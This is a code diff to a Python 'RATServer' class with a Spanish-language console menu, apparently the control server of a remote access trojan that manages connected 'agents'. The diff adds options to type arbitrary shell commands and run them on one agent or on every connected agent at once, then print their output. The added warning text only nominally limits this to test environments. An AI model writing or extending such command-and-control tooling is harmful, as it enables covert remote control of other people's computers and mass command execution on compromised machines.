@@ -179,7 +179,9 @@ class RATServer:
         print(" 5. Enviar comando a TODOS los agentes")
         print(" 6. Desconectar un agente")
         print(" 7. Ver logs de actividad")
-        print(" 8. Salir y cerrar servidor")
+        print(" 8. Ejecutar comando personalizado (un agente)")
+        print(" 9. Ejecutar comando personalizado (TODOS)")
+        print(" 10. Salir y cerrar servidor")
         print("="*60)
     
     def run_menu(self):
@@ -282,6 +284,53 @@ class RATServer:
                 print(f"  - Total de conexiones recibidas: {self.agent_counter}")
             
             elif choice == '8':
+                self.list_agents()
+                agent_id = input("\nIngrese ID del agente: ").strip()
+                try:
+                    agent_id = int(agent_id)
+                    print("\n⚠️  ADVERTENCIA: Ejecutar comandos personalizados puede ser peligroso")
+                    print("    Solo usar en entornos de prueba controlados")
+                    command = input("\nComando a ejecutar: ").strip()
+                    
+                    if command:
+                        confirm = input(f"¿Confirmar ejecución de '{command}' en agente {agent_id}? (s/n): ").strip().lower()
+                        if confirm == 's':
+                            print(f"\n[*] Ejecutando comando personalizado en agente {agent_id}...")
+                            result = self.send_command(agent_id, 'CUSTOM', {'command': command})
+                            if result:
+                                print(f"\n[+] Resultado:")
+                                print(f"Estado: {result.get('status', 'unknown')}")
+                                print(f"Salida:\n{result.get('output', 'Sin respuesta')}")
+                        else:
+                            print("[!] Comando cancelado")
+                    else:
+                        print("[-] Comando vacío")
+                except ValueError:
+                    print("[-] ID inválido")
+            
+            elif choice == '9':
+                print("\n⚠️  ADVERTENCIA: Ejecutar comandos personalizados en TODOS los agentes")
+                print("    Solo usar en entornos de prueba controlados")
+                command = input("\nComando a ejecutar en TODOS: ").strip()
+                
+                if command:
+                    confirm = input(f"¿Confirmar ejecución de '{command}' en {len(self.agents)} agentes? (s/n): ").strip().lower()
+                    if confirm == 's':
+                        print(f"\n[*] Ejecutando comando personalizado en todos los agentes...")
+                        results = self.send_command_to_all('CUSTOM', {'command': command})
+                        
+                        for agent_id, result in results.items():
+                            if result:
+                                print(f"\n[Agente {agent_id}]")
+                                print(f"Estado: {result.get('status', 'unknown')}")
+                                print(f"Salida: {result.get('output', 'Sin respuesta')}")
+                                print("-" * 60)
+                    else:
+                        print("[!] Comando cancelado")
+                else:
+                    print("[-] Comando vacío")
+            
+            elif choice == '10':
                 print("\n[!] Cerrando servidor...")
                 self.shutdown()
                 break
